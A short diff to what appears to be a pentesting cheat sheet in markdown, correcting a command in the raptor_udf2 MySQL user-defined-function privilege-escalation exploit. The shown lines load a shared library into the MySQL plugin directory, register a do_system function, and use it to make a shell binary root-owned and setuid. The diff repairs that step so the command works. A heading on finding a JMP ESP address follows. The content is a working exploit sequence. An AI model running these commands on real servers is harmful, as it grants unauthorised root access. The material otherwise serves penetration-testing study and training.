@@ -284,7 +284,7 @@ create table npn(line blob);
 insert into npn values(load_file('/tmp/raptor_udf2.so'));
 select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
 create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('chown root:root; chmod +s /tmp/sid-shell');
+select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
 ```
 
 ##### Finding JMP ESP Address
